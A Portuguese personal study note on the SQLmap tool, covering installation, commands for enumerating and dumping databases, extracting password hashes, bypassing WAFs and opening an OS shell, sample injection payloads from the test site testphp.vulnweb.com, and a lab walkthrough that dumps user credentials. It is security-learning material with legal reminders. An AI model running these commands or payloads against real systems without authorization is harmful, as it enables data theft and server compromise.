2025-06-27 05:55

Status: #developed #segurança 

Tags: [[CyberSecurity]] | [[SQL Injection]] | [[3 - Tags/Segurança/SQL]] | [[Pentest]] | [[Ferramentas]] | [[SQLmap]]

----
# Introdução

O **SQLmap** é uma das ferramentas mais poderosas e populares para detecção e exploração de vulnerabilidades de ***SQL Injection*** em aplicações web. Ele automatiza o processo de identificação e exploração de falhas em bancos de dados, permitindo que pentesters e pesquisadores de segurança descubram e explorem brechas em sistemas vulneráveis.

![[Pasted image 20250627060018.png]]

---
# Para que serve o SQLmap?

- Identificar parâmetros vulneráveis a SQL Injection;
- Extrair informações de bancos de dados (MySQL, PostgreSQL, Oracle, SQL Server, etc.)
- Realizar dump de tabelas e bancos de dados inteiros.
- Fazer bypass de mecanismos de segurança (WAFs, filtros).
- Executar comandos no sistema operacional (em casos avançados).

---
# Instalação do SQLmap

O SQLmap é desenvolvido em **Python** e pode ser instalado em sistemas **Linux, Windows e macOS**.

## Instalação no Kali Linux (pré-instalado)

```bash
sudo apt update
sudo apt install sqlmap
```

## Instalação via Git

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py --help
```

## Instalação no Windows

1. Baixe o Python em [python.org](https://www.python.org/downloads/).
2. Instale o SQLmap via Git (como acima) ou baixe o ZIP do repositório.
3. Execute via `python sqlmap.py [opções]`.

---
# Modos de Uso e Comandos Básicos

## 1. Verificando a Ajuda

```bash
sqlmap --help
```

## 2. Varredura Básica em um Alvo

```bash
sqlmap -u "http://exemplo.com/login.php?id=1"
```

## 3. Detectando Banco de Dados

```bash
sqlmap -u "http://exemplo.com/login.php?id=1" --dbs
```

## 4. Listando Tabelas de um Banco de Dados

```bash
sqlmap -u "http://exemplo.com/login.php?id=1" -D nome_banco --tables
```

## 5. Extraindo Dados de uma Tabela

```bash
sqlmap -u "http://exemplo.com/login.php?id=1" -D nome_banco -T usuarios --dump
```

## 6. Usando Autenticação (Cookies ou Headers)

```bash
sqlmap -u "http://exemplo.com/login.php?id=1" --cookie="PHPSESSID=12345"
```

## 7. Bypass de WAFs *(Web Application Firewalls)*

```bash
sqlmap -u "http://exemplo.com/login.php?id=1" --tamper=space2comment
```

## 8. Executando Comandos no Sistema (OS Shell)

```bash
sqlmap -u "http://exemplo.com/login.php?id=1" --os-shell
```

---
# Exemplos Práticos de Uso

## Testando um Parâmetro GET para SQL Injection

```bash
sqlmap -u "http://exemplo.com/login.php?id=1" --risk=3 --level=5
```

- `--risk=3` : aumenta a chance de detecção, mas pode ser mais intrusivo
- `--level=5`: testa mais profundamente

## Explorando um Formulário POST (Login)

Salve a requisição em um arquivo (`request.txt`)

```text
POST /login.php HTTP/1.1
Host: exemplo.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=123
```

Execute:

```bash
sqlmap -r request.text -p "username,password"
```

## Extraindo Hash de Senhas

```bash
sqlmap -u "http://exemplo.com/login.php?id=1" --passwords
```

## Usando Proxy (Burp Suite, OWASP ZAP)

```bash
sqlmap -u "http://exemplo.com/login.php?id=1" --proxy="http://127.0.0.1:8080"
```

## Salvando Resultados em um Arquivo

```bash
sqlmap -u "http://exemplo.com/login.php?id=1" --output-dir=relatorio
```


---
# Técnicas Avançadas

## 1. Bypass de Filtros com Tamper Scripts

O SQLmap possui scripts para contornar filtros:

```bash
sqlmap -u "http://exemplo.com/login.php?id=1" --tamper=between, randomcase
```

## 2. Exploração de Blind SQL Injection

```bash
sqlmap -u "http://exemplo.com/login.php?id=1" --technique=B
```

## 3. Dumping de um Banco de Dados Inteiro

```bash
sqlmap -u "http://exemplo.com/login.php?id=1" --dump-all
```

## 4. Conexão Direta ao Banco de Dados (Ataque Direto)

```bash
sqlmap -d "mysql://user:password@localhost:3306/database"
```

---
# Testando na Prática 1

Ao realizar testes no site ``testphp.vulnweb.com`` foram obtidos os seguintes resultados:

```text
SQLmap identified the following injection point(s) with a total of 51 HTTP(s) requests:

Parameter: cat (GET)
	Type: boolean-based blind
	Title: AND boolean-based blind - WHERE or HAVING clause
	Payload: cat=1 AND 6187=6187

	Type: error-based
	Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
	Payload: cat=1 AND GTID_SUBSET(CONCAT(0x7176717171, (SELECT(ELT(2824=2824,1))),0x7162717871),2824)

	Type: Time-based blind
	Title: MySQL >= 5.0.12 AND time-based blind (SLEEP)
	Payload: cat=1 AND SLEEP(5)

	Type: UNION query
	Title: Generic UNION query (NULL) - 11 columns
	Payload: cat=1 UNION ALL SELECT
NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONCAT(0x7176717171, 0x4f5851635a5642526f764d7869a4e71755471754861474f7968464f706d4874716c547a664e557a,0x7162717871), NULL, NULLL-- -

web server operating system: Linux Ubuntu
web application technology: Nginx 1.19.0, PHP 5.6.40
back-end DBMS: MySQL >= 5.6
```

## Interpretação detalhada do Resultado do SQLmap

O resultado obtido indica que o SQLmap identificou múltiplos tipos de vulnerabilidades de SQL Injection no parâmetro `cat` (enviado via GET).

## Vulnerabilidades Detectadas

### 1. Boolean-Based Blind SQL Injection

- **Tipo:** `boolean-based blind`
- **Descrição:** A aplicação responde de forma diferente dependendo se um condição SQL é verdadeira ou falsa.
- **Payload de teste:**

```sql
cat=1 AND 6187=6187
```

- Se a página se comportar de forma diferente quando `6187=6187` (verdadeiro) vs. `6187=1234` (falso), a vulnerabilidade existe.

### 2. Error-Based SQL Injection

- **Tipo:** `error-based`
- **Descrição:** A aplicação retorna erros do MySQL que podem revelar informações do banco de dados.
- **Payload de teste:**

```sql
cat=1 AND GTID_SUBSET(CONCAT(0x7176717171, (SELECT(ELT(2824=2824,1))),0x7162717871),2824)
```

- O SQLmap usa a função `GTID_SUBSET` (disponível no MySQL ≥ 5.6) para extrair dados via mensagens de erro.

### 3. Time-Based Blind SQL Injection

- **Tipo:** `time-based blind`
- **Descrição:** A aplicação demora mais para responder quando uma condição SQL é verdadeira.
- **Payload de teste:**

```sql
cat=1 AND SLEEP(5)
```

- Se a página demorar ~5 segundos para carregar, a vulnerabilidade existe.

### 4. UNION-Based SQL Injection

- **Tipo:** `UNION query`
- **Descrição:** Permite injetar uma consulta `UNION` para extrair dados de outras tabelas.
- **Payload de teste:**

```sql
cat=1 UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONCAT(0x7176717171, 0x4f5851635a5642526f764d7869a4e71755471754861474f7968464f706d4874716c547a664e557a,0x7162717871), NULL, NULL-- -
```

- O SQLmap testou um ataque `UNION` com 11 colunas (número de campos na consulta original)

## Informações Adicionais Coletadas

O SQLmap também identificou:

### 1. Sistema Operacional do Servidor Web

- **Linux Ubuntu:** pode ajudar a explorar vulnerabilidades específicas do sistema.

### 2. Tecnologias Usadas no Servidor Web

- **Nginx 1.19.0** (servidor web)
- **PHP 5.6.40** (versão antiga, pode ter vulnerabilidades conhecidas)

### 3. Banco de Dados

- **Back-end DBMS:** `MySQL >= 5.6`
	- o SQLmap detectou que o MySQL é **versão 5.6 ou superior** (importante para selecionar exploits).

---
# Testando na Prática 2

## Passo 1: Acessando SQLmap

- No Kali Linux, acesse o terminal de comandos localizado na barra de tarefas.

![[Pasted image 20250627113428.png]]

- No terminal, digite o seguinte comando para iniciar o SQLmap:

```bash
sqlmap
```

![[Pasted image 20250627113547.png]]

## Passo 2: Listando os bancos de dados da aplicação

- No terminal, digite o seguinte comando para que o SQLmap liste os bancos de dados da aplicação:

```bash
sqlmap -u <url> --dbs
```

- Ao final é possível notar que a ferramenta irá listar todos os bancos de dados da aplicação:

![[Pasted image 20250627113834.png]]

## Passo 3: Acessando o Banco de Dados

- Agora para acessar as tabelas do banco de dados `public` é preciso fazer o seguinte comando:

```bash
sqlmap -u <url> -D public --tables
```

- Em seguida é possível ver que o SQLmap irá listar as tabelas `products` e `users` ao final.

![[Pasted image 20250627114049.png]]

- Agora, para acessar as colunas da tabela `users`, é usado o seguinte comando:

```bash
sqlmap -u <url> -D public -T users --columns
```

- Ao final ele vai informar três colunas disponíveis dentro da tabela `users`, sendo elas `password`, `username` e `email` dos tipos varchar.

![[Pasted image 20250627114303.png]]

- Para ver os dados da tabela é usado o seguinte comando:

```bash
sqlmap -u <url> -D public -T users --columns "password,username,email" -dump
```

- E com isso, o SQLmap irá listar os usuários com suas respectivas senhas, sendo assim, é possível acessar o usuário `administrator` sem mesmo saber suas credenciais.

![[Pasted image 20250627114524.png]]

---
# Vantagens e Limitações

## **Vantagens**

✔ **Automatiza testes de SQL Injection** (economiza tempo).  
✔ **Suporte a múltiplos bancos de dados** (MySQL, PostgreSQL, Oracle, etc.).  
✔ **Bypass de WAFs** (usando tamper scripts).  
✔ **Extrai dados de forma eficiente** (hashes, tabelas, estruturas).

## **Limitações**

✖ **Pode ser detectado por sistemas de segurança** (IDS/IPS).  
✖ **Uso malicioso é ilegal** (sempre tenha permissão para testes).  
✖ **Não substitui análise manual** (alguns casos exigem verificação humana).

---
# Comparação com Outras Ferramentas


| **Ferramenta** | **SQLmap** | **Havij** | **jSQL Injection** | **SQLninja** |
| -------------- | ---------- | --------- | ------------------ | ------------ |
| Automação      | ⭐⭐⭐⭐⭐      | ⭐⭐⭐       | ⭐⭐⭐                | ⭐⭐           |
| Suporte a DBs  | ⭐⭐⭐⭐⭐      | ⭐⭐⭐       | ⭐⭐⭐                | ⭐⭐           |
| Bypass WAF     | ⭐⭐⭐⭐       | ⭐⭐        | ⭐⭐⭐                | ⭐            |
| Facilidade     | ⭐⭐⭐⭐       | ⭐⭐⭐⭐⭐     | ⭐⭐⭐                | ⭐⭐           |

---
# Boas Práticas e Considerações Legais

- **Sempre obtenha permissão** antes de testar em um sistema.
- **Use apenas em ambientes controlados** (laboratórios de pentest).
- **Não use para atividades ilegais** (pode resultar em processos criminais).

---
# Conclusão

O **SQLmap** é uma ferramenta essencial para qualquer profissional de segurança que trabalhe com testes de invasão em aplicações web. Sua capacidade de automatizar a detecção e exploração SQL Injection o torna extremamente eficiente, mas deve ser usado com responsabilidade.

Recomanda-se combiná-lo com outras ferramentas como **Burp Suite, OWASP ZAP e Nmap** para uma análise mais completa.

---
# Referências

- [GitHub do SQLMap](https://github.com/sqlmapproject/sqlmap)
- [Documentação Oficial](https://sqlmap.org/)
- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
